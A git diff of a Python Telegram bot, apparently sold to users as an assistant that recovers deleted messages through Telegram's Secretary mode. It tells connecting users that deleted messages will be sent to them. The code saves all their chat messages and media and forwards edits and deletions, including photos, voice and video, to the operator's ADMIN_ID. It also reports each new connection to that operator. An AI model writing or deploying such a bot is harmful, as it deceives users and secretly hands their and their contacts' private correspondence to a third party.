@@ -7,7 +7,7 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppI
 from telegram.ext import Application, MessageHandler, filters, CallbackQueryHandler, ContextTypes
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))  # Твой Telegram ID
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
 GITHUB_PAGES_URL = f"https://ggcrachvvv-arch.github.io/Nobot/index.html?v={int(time.time())}"
 
 logging.basicConfig(level=logging.INFO)
@@ -22,7 +22,6 @@ c.execute('''CREATE TABLE IF NOT EXISTS messages (
 conn.commit()
 
 def save_message(msg):
-    """Сохраняет все сообщения из всех чатов"""
     if not msg or not msg.from_user:
         return
     user = msg.from_user
@@ -38,9 +37,6 @@ def save_message(msg):
     elif msg.video:
         file_type = "video"
         file_id = msg.video.file_id
-    elif msg.video_note:
-        file_type = "video_note"
-        file_id = msg.video_note.file_id
     elif msg.text:
         file_type = "text"
     
@@ -48,7 +44,6 @@ def save_message(msg):
               (msg.message_id, msg.chat_id, user.id, user.username, user.first_name,
                msg.text, file_id, file_type, chat_title, datetime.now().isoformat()))
     conn.commit()
-    logging.info(f"💾 Сохранено от {user.first_name} в чате {chat_title}")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -66,17 +61,44 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    `Настройки` → `Секретарский режим` → `Добавить @HeiterszBOT`
    → Разреши доступ **«Ко всем чатам»**
 
-3️⃣ Всё! Теперь я буду сохранять все сообщения из твоих чатов и присылать тебе удалённые."""
+3️⃣ После подключения я напишу сюда подтверждение.
+
+✅ **Готово!**"""
     
     await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
 
+async def handle_business_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Бот подключён через Secretary Mode"""
+    if update.business_connection:
+        user_id = update.business_connection.user_id
+        c.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
+        conn.commit()
+        
+        # Отправляем подтверждение пользователю
+        await context.bot.send_message(
+            chat_id=user_id,
+            text="✅ **Бот успешно подключён!**\n\nТеперь я буду сохранять все сообщения из твоих чатов и присылать удалённые.",
+            parse_mode="Markdown"
+        )
+        
+        # Уведомляем админа
+        if ADMIN_ID:
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"🔗 Пользователь {user_id} подключил бота через Secretary Mode"
+            )
+        logging.info(f"Business connection от {user_id}")
+
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Сохраняем все сообщения"""
-    if update.message:
+    if update.message and update.message.from_user and update.message.chat.type != "private":
+        save_message(update.message)
+
+async def handle_private_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Сохраняем личные сообщения"""
+    if update.message and update.message.from_user and update.message.chat.type == "private":
         save_message(update.message)
 
 async def handle_edited(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка изменённых сообщений"""
     msg = update.edited_message
     if not msg:
         return
@@ -90,12 +112,11 @@ async def handle_edited(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if ADMIN_ID:
             await context.bot.send_message(
                 chat_id=ADMIN_ID,
-                text=f"✏️ **{name}** изменил(а) сообщение в чате **{chat_title}**:\n\n📌 Было: `{old_text[:300]}`\n\n🆕 Стало: `{msg.text[:300]}`",
+                text=f"✏️ **{name}** изменил(а) в **{chat_title}**:\n📌 Было: `{old_text[:300]}`\n🆕 Стало: `{msg.text[:300]}`",
                 parse_mode="Markdown"
             )
 
 async def handle_deleted(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка удалённых сообщений — отправляем тебе"""
     if not hasattr(update, 'deleted_business_messages') or not update.deleted_business_messages:
         return
     
@@ -106,7 +127,7 @@ async def handle_deleted(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if not row:
             if ADMIN_ID:
-                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ Удалено сообщение (не сохранено)\nChat ID: {d.chat_id}")
+                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ Удалено (не сохранено)\nChat: {d.chat_id}")
             continue
         
         first_name, username, text, file_type, file_id, chat_title = row
@@ -114,26 +135,26 @@ async def handle_deleted(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if ADMIN_ID:
             if file_type == "text":
-                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ **{name}** удалил(а) в чате **{chat_title}**:\n\n{text[:500]}", parse_mode="Markdown")
+                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ **{name}** удалил(а) в **{chat_title}**:\n\n{text[:500]}", parse_mode="Markdown")
             elif file_type == "voice":
-                await context.bot.send_voice(chat_id=ADMIN_ID, voice=file_id, caption=f"🎤 {name} удалил(а) голосовое в чате {chat_title}")
+                await context.bot.send_voice(chat_id=ADMIN_ID, voice=file_id, caption=f"🎤 {name} удалил(а) голосовое в {chat_title}")
             elif file_type == "photo":
-                await context.bot.send_photo(chat_id=ADMIN_ID, photo=file_id, caption=f"📷 {name} удалил(а) фото в чате {chat_title}")
+                await context.bot.send_photo(chat_id=ADMIN_ID, photo=file_id, caption=f"📷 {name} удалил(а) фото в {chat_title}")
             elif file_type == "video":
-                await context.bot.send_video(chat_id=ADMIN_ID, video=file_id, caption=f"🎥 {name} удалил(а) видео в чате {chat_title}")
+                await context.bot.send_video(chat_id=ADMIN_ID, video=file_id, caption=f"🎥 {name} удалил(а) видео в {chat_title}")
             else:
-                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ {name} удалил(а) {file_type} в чате {chat_title}")
-            
-            logging.info(f"📤 Удаление отправлено админу: {d.message_id}")
+                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ {name} удалил(а) {file_type} в {chat_title}")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(MessageHandler(filters.COMMAND & filters.Regex(r'/start'), start))
-    app.add_handler(MessageHandler(filters.ALL, handle_message))
+    app.add_handler(MessageHandler(filters.StatusUpdate.BUSINESS_CONNECTION, handle_business_connection))
+    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND, handle_private_message))
     app.add_handler(MessageHandler(filters.UpdateType.EDITED_MESSAGE, handle_edited))
     app.add_handler(MessageHandler(filters.ALL, handle_deleted), group=1)
     
-    logging.info("✅ DAsistent запущен. Мониторинг личных чатов активен.")
+    logging.info("✅ DAsistent запущен. Ожидание подключения Secretary Mode...")
     app.run_polling()
 
 if __name__ == "__main__":
